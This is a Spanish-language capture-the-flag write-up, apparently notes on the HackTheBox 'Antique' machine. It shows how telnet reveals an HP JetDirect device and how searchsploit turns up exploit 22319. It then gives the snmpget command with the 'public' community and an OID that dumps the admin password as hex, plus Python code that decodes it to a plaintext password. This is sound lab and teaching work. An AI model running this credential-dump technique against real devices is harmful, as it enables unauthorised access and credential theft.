Intentamos conectarnos a [[telnet]] usando el comando `telnet 10.10.11.107 23`, nos pide una contraseña la cual no sabemos, pero nos da esto de *HP JetDirect*
![[Antique10.png]]

### Buscando vulnerabilidades con [[searchsploit]]

Usamos ``searchsploit jetdirect`` y viendo todas a nosotros nos interesa la 22319 por lo que la vamos a descargar con el comando `searchsploit -m hardware/remote/22319.txt`

![[Antique8.png]]

Vamos a ver el archivo con [[cat]] usando el comando ``cat 22319.txt`
![[Antique9.png]]


###  Dumpeamos contraseña con [[snmpget]]

Modificando el payload que vimos en el exploit anterior, vamos a usar el comando `snmpget -v1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0` que nos va a servir para dumpear contraseñas en HEX

![[Antique7.png]]

nos da este output en hexadecimal

```
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
```


### [[Pasar de HEX a ascii con python]]

Abri el  interprete de python con `python` despues se importa la libreria binascci con el comando `import binascii` luego vamos a poner todos los numeros en hexadecimal dandoselos a una variable poniendo

```
s='50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 11 9 122 123 126 130 131 134 135'
```

Y luego para terminar vamos a usar la libreria que importamos al principio con ``binascii.unhexlify(s.replace(' ',''))`` usando el replace para sacar los espacios

![[Antique11.png]]
![[Antique12.png]]
Y nos da la contraseña *P@ssw0rd@123!!123*
